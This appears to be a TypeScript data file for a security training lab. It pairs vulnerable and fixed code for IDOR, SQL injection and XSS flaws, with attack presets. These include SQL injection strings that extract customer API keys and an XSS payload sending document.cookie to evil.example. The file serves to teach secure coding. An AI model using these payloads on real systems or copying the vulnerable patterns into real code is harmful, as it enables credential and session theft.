// Structure of the Atlas lab: code before and after the fix, attack presets.
// The prose lives in text.ts (lab.*), keyed by exercise id.

export type LabId = "idor" | "sqli" | "xss";

export interface LabExercise {
  id: LabId;
  /** Map node that explains the same flaw inside the company. */
  node: string;
  language: string;
  vulnerable: string;
  fixed: string;
  /** 1-based lines that are wrong in `vulnerable` and lines that changed in `fixed`. */
  vulnLines: number[];
  fixedLines: number[];
  presets: string[];
  initial: string;
}

export const labExercises: LabExercise[] = [
  {
    id: "idor",
    node: "a-api-idor",
    language: "js",
    vulnerable: `router.get("/v1/maps/:id", requireApiKey, async (req, res) => {
  const map = await db.maps.findById(req.params.id);
  if (!map) return res.sendStatus(404);
  res.json(map);
});`,
    fixed: `router.get("/v1/maps/:id", requireApiKey, async (req, res) => {
  const map = await db.maps.findOne({ id: req.params.id, owner: req.customer.id });
  if (!map) return res.sendStatus(404);
  res.json(map);
});`,
    vulnLines: [2],
    fixedLines: [2],
    presets: ["1", "4", "6"],
    initial: "1",
  },
  {
    id: "sqli",
    node: "a-api-search",
    language: "js",
    vulnerable: `router.get("/v1/search", requireApiKey, async (req, res) => {
  const q = req.query.q;
  const sql = \`SELECT id, title FROM maps WHERE owner = \${req.customer.id} AND title ILIKE '%\${q}%'\`;
  const rows = await db.raw(sql);
  res.json(rows);
});`,
    fixed: `router.get("/v1/search", requireApiKey, async (req, res) => {
  const q = req.query.q;
  const sql = "SELECT id, title FROM maps WHERE owner = $1 AND title ILIKE $2";
  const rows = await db.query(sql, [req.customer.id, \`%\${q}%\`]);
  res.json(rows);
});`,
    vulnLines: [3],
    fixedLines: [3, 4],
    presets: ["depot", "%' OR '1'='1", "x%' UNION SELECT id, api_key FROM customers --"],
    initial: "depot",
  },
  {
    id: "xss",
    node: "a-site-xss",
    language: "js",
    vulnerable: `export function MapCard({ map }) {
  return (
    <article className="card">
      <h3 dangerouslySetInnerHTML={{ __html: map.title }} />
      <p>{map.routes.length} routes</p>
    </article>
  );
}`,
    fixed: `export function MapCard({ map }) {
  return (
    <article className="card">
      <h3>{map.title}</h3>
      <p>{map.routes.length} routes</p>
    </article>
  );
}`,
    vulnLines: [4],
    fixedLines: [4],
    presets: ["<b>Depot</b> routes", "<img src=x onerror=\"fetch('//evil.example/?c='+document.cookie)\">", "<script>alert(1)</script>"],
    initial: "Depot routes",
  },
];
